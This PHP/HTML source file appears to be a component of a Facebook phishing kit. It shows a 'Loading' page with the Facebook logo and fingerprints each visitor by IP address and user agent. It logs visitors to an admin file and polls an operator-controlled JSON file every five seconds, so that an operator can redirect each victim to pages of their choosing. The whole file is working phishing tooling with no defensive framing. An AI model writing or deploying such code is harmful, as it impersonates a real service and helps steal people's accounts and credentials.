<?php
require_once 'admin/track.php';
// Function to generate userId based on IP address and user agent
function getUserId() {
    return md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']);
}

$userId = getUserId();

$file = 'admin/active_users.json';
$logFile = 'admin/debug.log';

// Load active_users.json and get the current redirection URL for the user
$activeUsers = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
$currentRedirectionUrl = isset($activeUsers[$userId]) ? $activeUsers[$userId]['redirectionUrl'] : '';

// Log current state
file_put_contents($logFile, date('Y-m-d H:i:s') . " - UserID: $userId - Current Redirection URL: $currentRedirectionUrl\n", FILE_APPEND);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #fff;
        }
        .login-container {
            text-align: center;
        }
        .login-container img {
            width: 150px; /* Adjust the size as needed */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="facebook.gif" alt="Facebook Login">
    </div>
    
      <input type="hidden" id="initialRedirectionUrl" value="<?php echo htmlspecialchars($currentRedirectionUrl); ?>">
  <input type="hidden" id="userId" value="<?php echo htmlspecialchars($userId); ?>">
    
      <script>
    function handleRedirection() {
            let userId = document.getElementById('userId').value;
            let initialRedirectionUrl = document.getElementById('initialRedirectionUrl').value;

            fetch('admin/active_users.json')
                .then(response => response.json())
                .then(data => {
               
                    if (data[userId] && data[userId].redirectionUrl) {
                        let currentRedirectionUrl = data[userId].redirectionUrl;
                        if (currentRedirectionUrl !== initialRedirectionUrl) {
                            window.location.href = currentRedirectionUrl; // Redirect based on stored URL
                        }
                    }
                })
                .catch(error => {
                    console.error('Error fetching active user data:', error);
                });
        }

        // Set interval to check for redirectionUrl changes every 5 seconds
        setInterval(handleRedirection, 5000);

        // Initial call to handleRedirection
        window.onload = handleRedirection;
        </script>
</body>
</html>
